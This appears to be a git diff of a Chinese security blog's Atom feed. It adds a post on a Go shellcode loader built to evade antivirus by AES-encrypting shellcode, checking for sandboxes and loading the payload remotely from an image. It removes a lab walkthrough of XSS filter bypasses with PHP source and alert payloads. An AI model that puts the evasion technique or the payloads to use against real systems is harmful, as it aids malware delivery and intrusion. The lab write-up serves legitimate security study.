@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://lnng.top/"/>
-  <updated>2021-07-15T01:44:03.211Z</updated>
+  <updated>2021-07-28T07:50:34.418Z</updated>
   <id>https://lnng.top/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>golangShellcode加载器 分离免杀</title>
+    <link href="https://lnng.top/posts/23a4.html"/>
+    <id>https://lnng.top/posts/23a4.html</id>
+    <published>2021-07-28T07:45:00.000Z</published>
+    <updated>2021-07-28T07:50:34.418Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="shellcodeloading"><a href="#shellcodeloading" class="headerlink" title="shellcodeloading"></a>shellcodeloading</h3><p>项目地址:<a href="https://github.com/Lmg66/shellcodeloading" target="_blank" rel="noopener">https://github.com/Lmg66/shellcodeloading</a><br>golang版 shellcode 加载器 </p><p>效果:实测可免杀360 火绒</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://www.bilibili.com/video/BV1jr4y1c7gJ" target="_blank" rel="noopener">小玉玉yyds</a></p><h3 id="目录说明"><a href="#目录说明" class="headerlink" title="目录说明"></a>目录说明</h3><pre><code>│  1.jpg        │  go.mod│  README.md│  shellcodeloading.go              //生成output/shellcode.go imageshellcode│├─.idea│      .gitignore│      modules.xml│      shellcodeloading.iml│      workspace.xml│├─aes                               //aes加密调用包│      aseCode.go│ ├─checkSandbox                        //沙箱检测调用包 20个进程 系统盘大于45g│      checkSandbox.go│└─output        compileShellGo.bat //用于编译shellcode.go—&gt;shellcode.exe 由shellcodeloading.go调用        lnng.jpg                  //含有shellcode aes密钥        shellcode.exe                    shellcode.go            //用于生成shellcode.exe</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>需要golang环境</p><p>因为shellcode.go 木马需要编译</p><h4 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h4><p>1.生成shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627206352705-image-20210725174518720.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627206482200-image-20210725174746525.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627206691165-image-20210725175115790.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627206783230-image-20210725175253002.png" alt=""></p><p>2.生成shellcode.exe</p><p>shellcodeloading目录</p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627206894340-image-20210725175442184.png" alt=""></p><p>选择想要的shellcode.exe方式</p><p>这里演示其中一种(分离免杀，imageshellcode路径写死在shellcode.exe中，远程加载shellcode)</p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627207169249-image-20210725175903529.png" alt=""></p><p>在output目录下我们就可以看到我们生成的shellcode.go(木马原文件) shellcode.exe(木马文件) lnng.jpg(分离免杀的shellcode)</p><p>将shellcode.exe 拖入带杀软的虚拟机中</p><p>这里用python3开启简单http服务，来加载imageshellcode，可以上传到图床等等地方(注意图片别被压缩)，地址别搞错就行</p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627207554631-image-20210725180505277.png" alt=""></p><h4 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h4><p><a href="https://www.bilibili.com/video/BV1Hq4y1p7c1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Hq4y1p7c1</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1627214620018-image-20210725200323206.png" alt=""></p><h3 id="参考文章说明"><a href="#参考文章说明" class="headerlink" title="参考文章说明"></a>参考文章说明</h3><p><a href="https://space.bilibili.com/50908119?spm_id_from=333.788.b_765f7570696e666f.2" target="_blank" rel="noopener"><strong>yuppt</strong>大佬视频</a></p><p><a href="https://gitee.com/cutecuteyu/picshell_bypassav" target="_blank" rel="noopener">https://gitee.com/cutecuteyu/picshell_bypassav</a></p><p>初学内网渗透，大佬们轻点喷</p><p>仅限技术分享研究与讨论，严禁用于非法用途，产生的一切后果自行承担</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;shellcodeloading&quot;&gt;&lt;a href=&quot;#shellcodeloading&quot; class=&quot;headerlink&quot; title=&quot;shellcodeloading&quot;&gt;&lt;/a&gt;shellcodeloading&lt;/h3&gt;&lt;p&gt;项目地址:&lt;a href=&quot;
+      
+    
+    </summary>
+    
+    
+      <category term="内网渗透" scheme="https://lnng.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="golang" scheme="https://lnng.top/tags/golang/"/>
+    
+      <category term="分离免杀" scheme="https://lnng.top/tags/%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"/>
+    
+      <category term="shellcode加载器" scheme="https://lnng.top/tags/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Fofa&amp;&amp;钟馗之眼爬虫(golang)</title>
@@ -513,34 +543,6 @@
       
       
         &lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h2&gt;&lt;p&gt;下载地址:&lt;a href=&quot;https://files.cnblogs.com/files/Lmg66/xssgame-master.zip
-      
-    
-    </summary>
-    
-    
-      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
-    
-      <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Web-for-Pentester靶场-xss部分</title>
-    <link href="https://lnng.top/posts/fb02.html"/>
-    <id>https://lnng.top/posts/fb02.html</id>
-    <published>2020-07-15T11:12:18.000Z</published>
-    <updated>2020-07-16T04:33:31.547Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>官网:<a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a><br>下载地址:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a><br>安装方法:虚拟机按照，该靶场是封装在debian系统里，安装完成打开，ifconfig查看ip地址：<br><img src="https://Lmg66.github.io/img/75.png" alt="图片"><br><img src="https://Lmg66.github.io/img/76.png" alt="图片"><br>然后直接访问ip即可<br>web for pentester默认没有root密码，可以来设置密码，方便ssh连接等查看源码</p><pre><code>sudo passwd</code></pre><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        echo $_GET[&quot;name&quot;];?&gt;</code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>没有任何的过滤，直接将get获取的打印</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>/xss/example1.php?name=<script>alert('xss')</script><br><img src="https://Lmg66.github.io/img/77.png" alt="图片"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><h4 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h4><p>这里通过preg_replace()函数来正则<script> </script>,但是这种匹配是有缺陷的，没有匹配大小写，可以通过大小写绕过<br><img src="https://Lmg66.github.io/img/78.png" alt="图片"></p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example2.php?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/79.png" alt="图片"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><h4 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h4><p>在第二关的基础上加了/i，使之匹配不区分大小写，preg_replace()函数将匹配到的，替换成空格，但是只匹配了一次，类似sql注入(Seselectlect)，可以嵌套&lt;sc<script>ript> </sc</script>ript&gt;，匹配到了，替换成空格变成我们想要的了</p><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/sc&lt;/script&gt;ript&gt;</code></pre><p><img src="https://Lmg66.github.io/img/80.png" alt="图片"></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><h4 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/script/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h4><p>对script进行了不区分大小写，匹配如果匹配到，就执行die(“error”),终止程序，所以scirpt不能用，只能通过其他标签来触发js事件，可使用onerror事件，来执行js<br><img src="https://Lmg66.github.io/img/81.png" alt="图片"><br><img src="https://Lmg66.github.io/img/82.png" alt="图片"></p><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example4.php?name=&lt;img src=&quot;xss&quot; onerror=alert(&#39;xss&#39;)&gt;</code></pre><p><img src="https://Lmg66.github.io/img/83.png" alt="图片"></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><h4 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/alert/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h4><p>对alert进行了过滤</p><h5 id="一-可以使用类似alert的方法来弹窗比如confirm，prompt"><a href="#一-可以使用类似alert的方法来弹窗比如confirm，prompt" class="headerlink" title="一.可以使用类似alert的方法来弹窗比如confirm，prompt"></a>一.可以使用类似alert的方法来弹窗比如confirm，prompt</h5><p><img src="https://Lmg66.github.io/img/84.png" alt="图片"><br><img src="https://Lmg66.github.io/img/85.png" alt="图片"></p><h5 id="二-通过编码绕过，String-fromCharCode-编码来绕过，可以使用hackbar来快速编码"><a href="#二-通过编码绕过，String-fromCharCode-编码来绕过，可以使用hackbar来快速编码" class="headerlink" title="二.通过编码绕过，String.fromCharCode()编码来绕过，可以使用hackbar来快速编码"></a>二.通过编码绕过，String.fromCharCode()编码来绕过，可以使用hackbar来快速编码</h5><p><img src="https://Lmg66.github.io/img/86.png" alt="图片"><br><img src="https://Lmg66.github.io/img/87.png" alt="图片"><br><img src="https://Lmg66.github.io/img/88.png" alt="图片"><br><img src="https://Lmg66.github.io/img/89.png" alt="图片"></p><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example5.php?name=&lt;script&gt;confirm(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/90.png" alt="图片"><br><img src="https://Lmg66.github.io/img/91.png" alt="图片"><br><img src="https://Lmg66.github.io/img/92.png" alt="图片"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><h4 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;        var $a= &quot;&lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;&quot;;&lt;/script&gt;</code></pre><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h4><p>通过get的方式传入name变量，输入赋值给全局变量a，可以通过闭合双引号或者注释双引号来增加我们的js代码</p><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);&quot;/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/93.png" alt="图片"><br><img src="https://Lmg66.github.io/img/94.png" alt="图片"><br><img src="https://Lmg66.github.io/img/95.png" alt="图片"><br><img src="https://Lmg66.github.io/img/96.png" alt="图片"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><h4 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;        var $a= &#39;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#39;;&lt;/script&gt;</code></pre><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h4><p>和第八关相似htmlentities()会把字符转换为HTML实体，会将双引号进行编码，但不编码单引号，这里使用的是单引好所以可以继续包含和注释</p><h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);&#39;/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/97.png" alt="图片"><br><img src="https://Lmg66.github.io/img/98.png" alt="图片"><br><img src="https://Lmg66.github.io/img/99.png" alt="图片"><br><img src="https://Lmg66.github.io/img/100.png" alt="图片"></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><h4 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php  require_once &#39;../header.php&#39;;if (isset($_POST[&quot;name&quot;])) {    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);  }?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot; method=&quot;POST&quot;&gt;Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</code></pre><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h4><p>name变量通过form表单以post方式传入，然后通过htmlentities函数实体化后输出来，并未找到破解的方法。然后观察<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">，用户可控制参数PHP_SELF，并且没有闭合引号和标签</p><h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example8.php/&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;///xss/example8.php/&quot; onclick=alert(&#39;XSS&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/101.png" alt="图片"><br><img src="https://Lmg66.github.io/img/102.png" alt="图片"><br><img src="https://Lmg66.github.io/img/103.png" alt="图片"></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><h4 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;  document.write(location.hash.substring(1));&lt;/script&gt;</code></pre><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h4><p>location.hash属性<br><img src="https://Lmg66.github.io/img/104.png" alt="图片"></p><h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example9.php#&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></pre><p>注意：在火狐和Chrome浏览器&lt;&gt;会被自动转码</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.sqlsec.com/2020/05/pentesterlab.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/pentesterlab.html</a><br><a href="https://blog.csdn.net/qq_20307987/article/details/51284169" target="_blank" rel="noopener">https://blog.csdn.net/qq_20307987/article/details/51284169</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h3&gt;&lt;p&gt;官网:&lt;a href=&quot;https://pentesterlab.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
       
     
     </summary>
